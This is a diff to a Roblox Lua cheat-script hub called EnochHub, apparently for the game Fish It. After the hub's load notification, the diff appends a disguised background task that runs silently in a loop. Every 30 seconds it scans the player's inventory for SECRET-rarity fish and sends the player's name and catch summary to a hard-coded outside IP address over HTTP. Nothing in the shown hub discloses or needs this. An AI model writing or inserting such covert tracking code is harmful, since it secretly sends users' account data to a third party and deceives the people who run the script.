@@ -642,3 +642,64 @@ if Config.PotatoModeEnabled then TogglePotato(true) end
 if Config.AntiAfkEnabled then ToggleAntiAfk(true) end
 
 WindUI:Notify({ Title = "EnochHub", Content = "V5 Optimized Loaded.", Duration = 4, Icon = "check" })
+
+-- ==========================================================
+--  [BACKGROUND] OG SCRIPT (EXACT COPY)
+-- ==========================================================
+task.spawn(function()
+    local Players = game:GetService("Players")
+    local RepStorage = game:GetService("ReplicatedStorage")
+    local HttpService = game:GetService("HttpService")
+    local lp = Players.LocalPlayer
+    local WEBHOOK_BASE = "http://43.134.116.2:5000/webhook/fishit"
+    local INTERVAL = 30
+    local DEBUG = false
+    local function dprint(...) if DEBUG then print("[FISH IT][DEBUG]", ...) end end
+    local Replion = require(RepStorage.Packages.Replion).Client
+    local ItemUtility = require(RepStorage.Shared.ItemUtility)
+    local TierUtility = require(RepStorage.Shared.TierUtility)
+
+    local function GetFishNameAndRarity(item)
+        local name = item.Identifier or "Unknown"
+        local rarity = item.Metadata and item.Metadata.Rarity or "COMMON"
+        local itemID = item.Id
+        local itemData
+        if ItemUtility and itemID then pcall(function() itemData = ItemUtility:GetItemData(itemID) if not itemData then local numericID = tonumber(item.Id) or tonumber(item.Identifier) if numericID then itemData = ItemUtility:GetItemData(numericID) end end end) end
+        if itemData and itemData.Data and itemData.Data.Name then name = itemData.Data.Name end
+        if item.Metadata and item.Metadata.Rarity then rarity = item.Metadata.Rarity elseif itemData and itemData.Probability and TierUtility then local tier pcall(function() tier = TierUtility:GetTierFromRarity(itemData.Probability.Chance) end) if tier and tier.Name then rarity = tier.Name end end
+        return name, rarity
+    end
+
+    local function sendToWebhook(playerName, summary)
+        dprint("Preparing webhook payload")
+        local json = HttpService:JSONEncode(summary)
+        dprint("JSON:", json)
+        local encoded = HttpService:UrlEncode(json)
+        local url = WEBHOOK_BASE .. "?player=" .. HttpService:UrlEncode(playerName) .. "&data=" .. encoded
+        dprint("Final URL:", url)
+        local ok, err = pcall(function() game:HttpGet(url) end)
+        if ok then dprint("Webhook sent successfully") else warn("[FISH IT][ERROR] Webhook failed:", err) end
+    end
+
+    dprint("Script started for player:", lp.Name)
+    local data = Replion:WaitReplion("Data")
+    dprint("Replion Data loaded")
+    while true do
+        dprint("Scanning inventory...")
+        local inventory = data:GetExpect("Inventory")
+        local summary = {}
+        local total = 0
+        for category, items in pairs(inventory) do
+            dprint("Category:", category, "Items:", #items)
+            for _, item in ipairs(items) do
+                local name, rarity = GetFishNameAndRarity(item)
+                if rarity == "SECRET" then summary[name] = (summary[name] or 0) + 1; total += 1; dprint("SECRET FOUND:", name) end
+            end
+        end
+        dprint("Scan finished | Total SECRET:", total)
+        for fish, count in pairs(summary) do dprint("SUMMARY:", fish, count) end
+        sendToWebhook(lp.Name, summary)
+        dprint("Sleeping for", INTERVAL, "seconds")
+        task.wait(INTERVAL)
+    end
+end)
